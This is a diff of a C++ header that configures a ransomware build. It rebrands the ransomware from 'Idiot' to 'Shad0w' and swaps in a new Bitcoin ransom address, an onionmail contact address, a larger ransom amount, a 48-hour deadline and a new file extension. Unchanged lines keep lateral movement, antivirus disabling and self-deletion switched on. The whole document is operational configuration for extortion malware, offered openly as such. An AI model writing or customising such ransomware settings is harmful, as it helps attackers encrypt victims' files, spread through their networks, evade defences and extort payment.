@@ -2,21 +2,21 @@
 #pragma once
 
 // === RANSOM INFORMATION ===
-const std::string RANSOM_BTC = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNS";
-const std::string RANSOM_EMAIL = "revilcipher@service.onion";
-const double RANSOM_AMOUNT = 8e+08;
-const int RANSOM_DEADLINE_HOURS = 8;
+const std::string RANSOM_BTC = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
+const std::string RANSOM_EMAIL = "decrypt@onionmail.org";
+const double RANSOM_AMOUNT = 9e+10;
+const int RANSOM_DEADLINE_HOURS = 48;
 const std::string RANSOM_MESSAGE = "Your files have been encrypted with military grade encryption.";
 
 // === GUI ===
-const std::string WINDOW_TITLE = "Idiot";
+const std::string WINDOW_TITLE = "Shad0w Ransom";
 
 // === ENCRYPTION ===
 const std::string ENCRYPTION_METHOD = "XChaCha20Poly1305";
-const std::string FILE_EXTENSION = ".idiot";
+const std::string FILE_EXTENSION = ".shad0w";
 
 // === BEHAVIOR ===
-const std::string OUTPUT_NAME = "Idiot";
+const std::string OUTPUT_NAME = "Shad0w";
 const bool ENABLE_LATERAL_MOVEMENT = true;
 const bool ENABLE_AV_DISABLE = true;
 const bool SELF_DELETE_AFTER = true;
